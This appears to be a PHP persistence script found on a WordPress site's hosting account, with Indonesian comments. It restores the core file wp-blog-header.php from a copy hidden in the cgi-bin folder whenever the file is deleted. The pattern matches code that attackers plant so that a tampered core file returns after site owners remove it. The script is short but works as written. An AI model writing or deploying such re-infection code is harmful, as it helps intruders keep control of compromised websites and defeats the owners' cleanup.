<?php
$file = '/home/he109633/aislacastilla.com/wp-blog-header.php';
$backup = '/home/he109633/aislacastilla.com/cgi-bin/backup.php';

// file cek
if (!file_exists($file)) {
    // Jika file dihapus, kembalikan dari backup
    copy($backup, $file);
    echo "/home/he109633/aislacastilla.com/cgi-bin/backup.php";
} else {
    echo "/home/he109633/aislacastilla.com/cgi-bin/backup.php";
}
?>
